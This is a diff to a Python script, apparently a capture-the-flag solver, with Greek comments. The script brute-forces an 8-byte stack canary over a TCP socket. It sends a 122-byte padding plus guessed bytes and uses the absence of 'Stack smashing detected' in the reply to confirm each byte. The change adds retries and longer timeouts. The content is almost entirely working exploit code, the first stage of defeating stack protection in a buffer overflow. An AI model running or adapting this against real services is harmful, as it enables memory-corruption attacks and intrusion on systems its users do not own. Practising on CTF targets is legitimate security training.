@@ -6,43 +6,48 @@ def solve():
     padding = b"A" * 122
     known_canary = b""
 
-    print("--- Starting Robust Brute-force (8 bytes) ---")
+    print("--- Starting Patient Brute-force (8 bytes) ---")
 
     for i in range(8):
-        print(f"Searching for byte {i}...", end=" ", flush=True)
+        print(f"\nSearching for byte {i}: ", end="", flush=True)
         found = False
-        for candidate in range(256):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.5) # Αυξημένο timeout
-                s.connect((host, port))
-                
-                payload = padding + known_canary + bytes([candidate])
-                s.sendall(payload)
-                
-                try:
-                    data = s.recv(1024)
-                except socket.timeout:
-                    data = b"timeout" # Θεωρούμε το timeout ως αποτυχία
-                
-                s.close()
-
-                # ΠΡΟΣΟΧΗ: Πρέπει η απάντηση να ΜΗΝ έχει το smashing 
-                # ΑΛΛΑ να έχει την κανονική έξοδο του προγράμματος (π.χ. το "Twit:")
-                if data != b"timeout" and b"Stack smashing detected" not in data:
-                    known_canary += bytes([candidate])
-                    print(f"Found: {hex(candidate)}")
-                    found = True
-                    break
-            except:
-                time.sleep(0.01) # Μικρή ανάσα για το socket
-                continue
         
+        for candidate in range(256):
+            attempts = 0
+            while attempts < 3: # Προσπάθησε 3 φορές για κάθε byte αν αποτύχει το δίκτυο
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1.0) # Περισσότερος χρόνος για τον server
+                    s.connect((host, port))
+                    
+                    payload = padding + known_canary + bytes([candidate])
+                    s.sendall(payload)
+                    
+                    data = s.recv(1024)
+                    s.close()
+
+                    # Αν ο server απάντησε κανονικά και ΔΕΝ έβγαλε smashing
+                    if b"Twit:" in data and b"Stack smashing detected" not in data:
+                        known_canary += bytes([candidate])
+                        print(f"[{hex(candidate)}]", end="", flush=True)
+                        found = True
+                        break
+                    
+                    # Αν απάντησε αλλά έβγαλε smashing, πάμε στον επόμενο candidate
+                    break 
+
+                except (socket.timeout, ConnectionRefusedError, OSError):
+                    attempts += 1
+                    time.sleep(1) # Περίμενε 1 δευτερόλεπτο αν "μπουκώσει"
+            
+            if found: break
+            if candidate % 32 == 0: print(".", end="", flush=True) # visual progress
+
         if not found:
-            print("\n[!] Failed to find byte. Server might be rate-limiting.")
+            print(f"\n[!] Failed to find byte {i} after all candidates.")
             break
 
-    print(f"\nFINAL_CANARY: {known_canary.hex()}")
+    print(f"\n\nFINAL_CANARY: {known_canary.hex()}")
 
 if __name__ == "__main__":
     solve()
